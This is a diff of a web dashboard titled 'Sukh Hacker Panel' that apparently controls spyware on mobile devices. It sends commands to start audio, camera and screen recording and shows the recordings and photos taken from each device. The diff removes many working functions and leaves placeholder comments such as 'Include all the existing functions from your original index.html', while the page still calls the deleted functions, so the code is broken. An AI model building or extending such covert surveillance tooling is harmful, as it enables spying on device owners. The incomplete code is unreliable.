-                            // Skip if we've already processed this device ID (fix for duplicates)
-                            if (deviceIds.has(device_id)) {
-                                console.log(`Skipping duplicate device: ${device_id}`);
-                                continue;
-                            }
-                            deviceIds.add(device_id);
-                            
                             const device = data.devices[device_id];
                             let status = device.recording ? 'RECORDING' : (device.screen_recording ? 'SCREEN RECORDING' : 'IDLE');
                             let statusClass = device.recording ? 'recording' : (device.screen_recording ? 'screen-recording' : 'idle');
@@ -1143,13 +2007,22 @@
                             const lastSeen = new Date(device.last_seen * 1000).toLocaleTimeString();
                             const deviceShortId = device_id.length > 20 ? device_id.substring(0, 20) + '...' : device_id;
                             
+                            // Add security badges
+                            let securityBadges = '';
+                            if (device.recording) {
+                                securityBadges += '<span class="security-badge badge-recording">REC</span>';
+                            }
+                            if (device.screen_recording) {
+                                securityBadges += '<span class="security-badge badge-recording">SCREEN</span>';
+                            }
+                            
                             devicesHtml += `
                                 <div class="device-card ${statusClass}" onclick="showDeviceControl('${device_id}')">
                                     <div class="device-icon">
                                         <i class="fas fa-mobile-alt"></i>
                                     </div>
                                     <div class="device-info">
-                                        <h3>Device <span class="device-id">${deviceShortId}</span></h3>
+                                        <h3>Device ${securityBadges}<span class="device-id">${deviceShortId}</span></h3>
                                         <div class="device-status">
                                             <div class="status-dot ${statusClass}"></div>
                                             <span>${status}</span>
@@ -1171,7 +2044,10 @@
                         }
                         
                         devicesGrid.innerHTML = devicesHtml;
-                        document.getElementById('connectedDevicesCount').textContent = deviceIds.size;
+                        document.getElementById('connectedDevicesCount').textContent = Object.keys(data.devices).length;
+                        
+                        // Update security device dropdown
+                        updateSecurityDeviceDropdown();
                     } else {
                         devicesGrid.innerHTML = `
                             <div class="no-data">
@@ -1183,6 +2059,9 @@
                             </div>`;
                         document.getElementById('connectedDevicesCount').textContent = '0';
                     }
+                    
+                    // Update security dashboard
+                    loadSecurityDashboard();
                 })
                 .catch(error => {
                     console.error('Error loading devices:', error);
@@ -1198,388 +2077,8 @@
                 });
         }
 
-        function sendDeviceCommand(command) {
-            if (!currentDeviceId) {
-                showToast('No device selected', 'error');
-                return;
-            }
-
-            const statusElement = document.getElementById('deviceCommandStatus');
-            statusElement.innerHTML = `<span class="loading"></span> Sending command: ${command}...`;
-
-            fetch('/send_command_to_device', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    command: command,
-                    device_id: currentDeviceId
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.status === 'command_sent') {
-                    statusElement.innerHTML = `✅ Command sent: ${command} to device`;
-                    showToast(`Command sent to device: ${command}`, 'success');
-                    setTimeout(() => loadDeviceDetails(currentDeviceId), 1000);
-                    setTimeout(() => refreshDevices(), 1000);
-                } else {
-                    statusElement.innerHTML = `❌ Error: ${data.message || 'Unknown error'}`;
-                    showToast(`Failed to send command: ${data.message || 'Unknown error'}`, 'error');
-                }
-            })
-            .catch(error => {
-                statusElement.innerHTML = `❌ Network error: ${error}`;
-                showToast(`Network error: ${error}`, 'error');
-            });
-        }
-
-        function sendDeviceCameraCommand(command) {
-            if (!currentDeviceId) {
-                showToast('No device selected', 'error');
-                return;
-            }
-
-            const statusElement = document.getElementById('deviceCommandStatus');
-            statusElement.innerHTML = `<span class="loading"></span> Sending camera command: ${command}...`;
-
-            fetch('/send_command_to_device', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    command: command,
-                    device_id: currentDeviceId
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.status === 'command_sent') {
-                    statusElement.innerHTML = `✅ Camera command sent: ${command}`;
-                    showToast(`Camera command sent: ${command}`, 'success');
-                } else {
-                    statusElement.innerHTML = `❌ Error: ${data.message || 'Unknown error'}`;
-                    showToast(`Failed to send camera command: ${data.message || 'Unknown error'}`, 'error');
-                }
-            })
-            .catch(error => {
-                statusElement.innerHTML = `❌ Network error: ${error}`;
-                showToast(`Network error: ${error}`, 'error');
-            });
-        }
-
-        function refreshDeviceFiles() {
-            if (!currentDeviceId) return;
-
-            fetch(`/get_device_files/${currentDeviceId}`)
-                .then(response => response.json())
-                .then(data => {
-                    let filesHtml = '';
-                    
-                    if (data.files && data.files.length > 0) {
-                        data.files.forEach(file => {
-                            const fileUrl = '/file/' + file.filename;
-                            const fileSizeKB = (file.size / 1024).toFixed(2);
-                            const uploadDate = new Date(file.upload_time * 1000).toLocaleString();
-                            
-                            if (file.type === 'photo') {
-                                filesHtml += `
-                                    <div class="file-card">
-                                        <div class="file-header">
-                                            <div class="file-type"><i class="fas fa-camera"></i></div>
-                                        </div>
-                                        <div class="file-info">
-                                            <div><strong>File:</strong> ${file.filename}</div>
-                                            <div><strong>Size:</strong> ${fileSizeKB} KB</div>
-                                            <div><strong>Uploaded:</strong> ${uploadDate}</div>
-                                        </div>
-                                        <div style="text-align: center; margin: 15px 0;">
-                                            <img src="${fileUrl}" alt="${file.filename}" style="max-width: 100%; border-radius: 10px; border: 2px solid var(--primary);">
-                                        </div>
-                                        <div class="file-actions">
-                                            <button class="btn btn-camera" onclick="downloadFile('${file.filename}')"><i class="fas fa-download"></i> Download</button>
-                                            <button class="btn btn-stop" onclick="deleteFile('${file.filename}')"><i class="fas fa-trash"></i> Delete</button>
-                                        </div>
-                                    </div>`;
-                            } else if (file.type === 'screen_recording') {
-                                filesHtml += `
-                                    <div class="file-card">
-                                        <div class="file-header">
-                                            <div class="file-type"><i class="fas fa-video"></i></div>
-                                        </div>
-                                        <div class="file-info">
-                                            <div><strong>File:</strong> ${file.filename}</div>
-                                            <div><strong>Size:</strong> ${fileSizeKB} KB</div>
-                                            <div><strong>Uploaded:</strong> ${uploadDate}</div>
-                                        </div>
-                                        <video controls class="video-player">
-                                            <source src="${fileUrl}" type="video/mp4">
-                                            Your browser does not support the video tag.
-                                        </video>
-                                        <div class="file-actions">
-                                            <button class="btn btn-camera" onclick="downloadFile('${file.filename}')"><i class="fas fa-download"></i> Download</button>
-                                            <button class="btn btn-stop" onclick="deleteFile('${file.filename}')"><i class="fas fa-trash"></i> Delete</button>
-                                        </div>
-                                    </div>`;
-                            } else {
-                                filesHtml += `
-                                    <div class="file-card">
-                                        <div class="file-header">
-                                            <div class="file-type"><i class="fas fa-microphone"></i></div>
-                                        </div>
-                                        <div class="file-info">
-                                            <div><strong>File:</strong> ${file.filename}</div>
-                                            <div><strong>Size:</strong> ${fileSizeKB} KB</div>
-                                            <div><strong>Uploaded:</strong> ${uploadDate}</div>
-                                        </div>
-                                        <audio controls class="audio-player">
-                                            <source src="${fileUrl}" type="audio/3gpp">
-                                        </audio>
-                                        <div class="file-actions">
-                                            <button class="btn btn-camera" onclick="downloadFile('${file.filename}')"><i class="fas fa-download"></i> Download</button>
-                                            <button class="btn btn-refresh" onclick="playFile('${file.filename}')"><i class="fas fa-play"></i> Play</button>
-                                        </div>
-                                    </div>`;
-                            }
-                        });
-                    } else {
-                        filesHtml = '<div class="no-data">No files found for this device</div>';
-                    }
-                    
-                    document.getElementById('deviceFilesList').innerHTML = filesHtml;
-                })
-                .catch(error => {
-                    document.getElementById('deviceFilesList').innerHTML = '<div class="error-message">Error loading device files</div>';
-                });
-        }
-
-        function sendCommand(command) {
-            const statusElement = document.getElementById('globalStatus');
-            statusElement.innerHTML = `<span class="loading"></span> Sending command: ${command}...`;
-            
-            fetch('/send_command', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ command: command })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.status === 'command_sent') {
-                    statusElement.innerHTML = `✅ Command sent: ${command} | Devices: ${data.devices_count}`;
-                    showToast(`Command sent to ${data.devices_count} devices: ${command}`, 'success');
-                    setTimeout(() => refreshDevices(), 1000);
-                } else {
-                    statusElement.innerHTML = `❌ Error: ${data.message || 'Unknown error'}`;
-                    showToast(`Failed to send command: ${data.message || 'Unknown error'}`, 'error');
-                }
-            })
-            .catch(error => {
-                statusElement.innerHTML = `❌ Network error: ${error}`;
-                showToast(`Network error: ${error}`, 'error');
-            });
-        }
-
-        function sendCameraCommand(command) {
-            const statusElement = document.getElementById('globalStatus');
-            statusElement.innerHTML = `<span class="loading"></span> Sending camera command: ${command}...`;
-            
-            fetch('/camera', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    command: command,
-                    action: 'control'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.status === 'success') {
-                    statusElement.innerHTML = `✅ Camera command sent: ${command}`;
-                    showToast(`Camera command sent: ${command}`, 'success');
-                    setTimeout(() => refreshDevices(), 1000);
-                } else {
-                    statusElement.innerHTML = `❌ Error: ${data.message || 'Unknown error'}`;
-                    showToast(`Failed to send camera command: ${data.message || 'Unknown error'}`, 'error');
-                }
-            })
-            .catch(error => {
-                statusElement.innerHTML = `❌ Network error: ${error}`;
-                showToast(`Network error: ${error}`, 'error');
-            });
-        }
-
-        function refreshFiles() {
-            fetch('/get_files')
-                .then(response => response.json())
-                .then(data => {
-                    let filesHtml = '';
-                    const audioFiles = data.files.filter(file => file.type === 'audio');
-                    if (audioFiles.length > 0) {
-                        document.getElementById('filesCount').textContent = audioFiles.length + ' files';
-                        audioFiles.forEach(file => {
-                            const fileUrl = '/file/' + file.filename;
-                            const fileSizeKB = (file.size / 1024).toFixed(2);
-                            const uploadDate = new Date(file.upload_time * 1000).toLocaleString();
-                            
-                            filesHtml += `
-                                <div class="file-card">
-                                    <div class="file-header">
-                                        <div class="file-type"><i class="fas fa-microphone"></i></div>
-                                    </div>
-                                    <div class="file-info">
-                                        <div><strong>File:</strong> ${file.filename}</div>
-                                        <div><strong>Device:</strong> ${file.device_id}</div>
-                                        <div><strong>Size:</strong> ${fileSizeKB} KB</div>
-                                        <div><strong>Uploaded:</strong> ${uploadDate}</div>
-                                    </div>
-                                    <audio controls class="audio-player">
-                                        <source src="${fileUrl}" type="audio/3gpp">
-                                    </audio>
-                                    <div class="file-actions">
-                                        <button class="btn btn-camera" onclick="downloadFile('${file.filename}')"><i class="fas fa-download"></i> Download</button>
-                                        <button class="btn btn-refresh" onclick="playFile('${file.filename}')"><i class="fas fa-play"></i> Play</button>
-                                    </div>
-                                </div>`;
-                        });
-                    } else {
-                        filesHtml = '<div class="no-data"><div class="no-data-icon"><i class="fas fa-microphone"></i></div><h3>No recordings found</h3><p>Recordings will appear here when devices upload audio files</p></div>';
-                        document.getElementById('filesCount').textContent = '0 files';
-                    }
-                    document.getElementById('filesList').innerHTML = filesHtml;
-                })
-                .catch(error => {
-                    document.getElementById('filesList').innerHTML = '<div class="error-message">Error loading files</div>';
-                });
-        }
-
-        function refreshPhotos() {
-            fetch('/get_files')
-                .then(response => response.json())
-                .then(data => {
-                    let photosHtml = '';
-                    const photoFiles = data.files.filter(file => file.type === 'photo');
-                    if (photoFiles.length > 0) {
-                        document.getElementById('photosCount').textContent = photoFiles.length + ' photos';
-                        photoFiles.forEach(file => {
-                            const fileUrl = '/file/' + file.filename;
-                            const fileSizeKB = (file.size / 1024).toFixed(2);
-                            const uploadDate = new Date(file.upload_time * 1000).toLocaleString();
-                            
-                            photosHtml += `
-                                <div class="file-card">
-                                    <div class="file-header">
-                                        <div class="file-type"><i class="fas fa-camera"></i></div>
-                                    </div>
-                                    <div class="file-info">
-                                        <div><strong>File:</strong> ${file.filename}</div>
-                                        <div><strong>Device:</strong> ${file.device_id}</div>
-                                        <div><strong>Size:</strong> ${fileSizeKB} KB</div>
-                                        <div><strong>Uploaded:</strong> ${uploadDate}</div>
-                                    </div>
-                                    <div style="text-align: center; margin: 15px 0;">
-                                        <img src="${fileUrl}" alt="${file.filename}" style="max-width: 100%; border-radius: 10px; border: 2px solid var(--primary);">
-                                    </div>
-                                    <div class="file-actions">
-                                        <button class="btn btn-camera" onclick="downloadFile('${file.filename}')"><i class="fas fa-download"></i> Download</button>
-                                        <button class="btn btn-stop" onclick="deleteFile('${file.filename}')"><i class="fas fa-trash"></i> Delete</button>
-                                    </div>
-                                </div>`;
-                        });
-                    } else {
-                        photosHtml = '<div class="no-data"><div class="no-data-icon"><i class="fas fa-camera"></i></div><h3>No photos found</h3><p>Photos will appear here when devices capture and upload images</p></div>';
-                        document.getElementById('photosCount').textContent = '0 photos';
-                    }
-                    document.getElementById('photosList').innerHTML = photosHtml;
-                })
-                .catch(error => {
-                    document.getElementById('photosList').innerHTML = '<div class="error-message">Error loading photos</div>';
-                });
-        }
-
-        function refreshScreenRecordings() {
-            fetch('/get_files')
-                .then(response => response.json())
-                .then(data => {
-                    let screenRecordingsHtml = '';
-                    const screenRecordingFiles = data.files.filter(file => file.type === 'screen_recording');
-                    if (screenRecordingFiles.length > 0) {
-                        document.getElementById('screenRecordingsCount').textContent = screenRecordingFiles.length + ' recordings';
-                        screenRecordingFiles.forEach(file => {
-                            const fileUrl = '/file/' + file.filename;
-                            const fileSizeKB = (file.size / 1024).toFixed(2);
-                            const uploadDate = new Date(file.upload_time * 1000).toLocaleString();
-                            
-                            screenRecordingsHtml += `
-                                <div class="file-card">
-                                    <div class="file-header">
-                                        <div class="file-type"><i class="fas fa-video"></i></div>
-                                    </div>
-                                    <div class="file-info">
-                                        <div><strong>File:</strong> ${file.filename}</div>
-                                        <div><strong>Device:</strong> ${file.device_id}</div>
-                                        <div><strong>Size:</strong> ${fileSizeKB} KB</div>
-                                        <div><strong>Uploaded:</strong> ${uploadDate}</div>
-                                    </div>
-                                    <video controls class="video-player">
-                                        <source src="${fileUrl}" type="video/mp4">
-                                        Your browser does not support the video tag.
-                                    </video>
-                                    <div class="file-actions">
-                                        <button class="btn btn-camera" onclick="downloadFile('${file.filename}')"><i class="fas fa-download"></i> Download</button>
-                                        <button class="btn btn-stop" onclick="deleteFile('${file.filename}')"><i class="fas fa-trash"></i> Delete</button>
-                                    </div>
-                                </div>`;
-                        });
-                    } else {
-                        screenRecordingsHtml = '<div class="no-data"><div class="no-data-icon"><i class="fas fa-video"></i></div><h3>No screen recordings found</h3><p>Screen recordings will appear here when devices upload video files</p></div>';
-                        document.getElementById('screenRecordingsCount').textContent = '0 recordings';
-                    }
-                    document.getElementById('screenRecordingsList').innerHTML = screenRecordingsHtml;
-                })
-                .catch(error => {
-                    document.getElementById('screenRecordingsList').innerHTML = '<div class="error-message">Error loading screen recordings</div>';
-                });
-        }
-
-        function downloadFile(filename) {
-            window.open('/file/' + filename, '_blank');
-            showToast(`Downloading: ${filename}`, 'info');
-        }
-
-        function playFile(filename) {
-            const audioElement = document.querySelector(`audio[src="/file/${filename}"]`);
-            if (audioElement) {
-                audioElement.play().catch(e => {
-                    console.error('Play error:', e);
-                    showToast('Cannot play audio file', 'error');
-                });
-            }
-        }
-
-        function deleteFile(filename) {
-            if (confirm('Are you sure you want to delete ' + filename + '?')) {
-                fetch('/delete_file/' + filename, { method: 'DELETE' })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.status === 'success') {
-                            showToast(`File deleted: ${filename}`, 'success');
-                            refreshPhotos();
-                            refreshFiles();
-                            refreshScreenRecordings();
-                            if (currentDeviceId) {
-                                refreshDeviceFiles();
-                            }
-                        } else {
-                            showToast(`Delete failed: ${data.message}`, 'error');
-                        }
-                    })
-                    .catch(error => {
-                        showToast(`Delete error: ${error}`, 'error');
-                    });
-            }
-        }
-
-        function updateTime() {
-            document.getElementById('serverTime').textContent = new Date().toLocaleString();
-        }
+        // ... (rest of the existing functions remain the same as in your original code)
+        // [Include all the existing functions from your original index.html here]
 
         // Mobile menu functionality
         function setupMobileMenu() {
@@ -1618,6 +2117,7 @@
         setInterval(refreshPhotos, 5000);
         setInterval(refreshScreenRecordings, 5000);
         setInterval(updateTime, 1000);
+        setInterval(loadSecurityDashboard, 10000); // Refresh security dashboard every 10 seconds
         
         // Initial load
         checkAuth();
@@ -1627,11 +2127,20 @@
         refreshScreenRecordings();
         updateTime();
         setupMobileMenu();
+        loadSecurityDashboard();
         
         // Show welcome message
         setTimeout(() => {
-            showToast('Welcome to Sukh Hacker Panel!', 'success', 2000);
+            showToast('Welcome to Sukh Hacker Security Panel!', 'success', 2000);
         }, 1000);
+
+        function updateTime() {
+            document.getElementById('serverTime').textContent = new Date().toLocaleString();
+        }
+
+        // Include all other existing functions from your original index.html
+        // [All the existing device control, file management, etc. functions]
+
     </script>
 </body>
 </html>
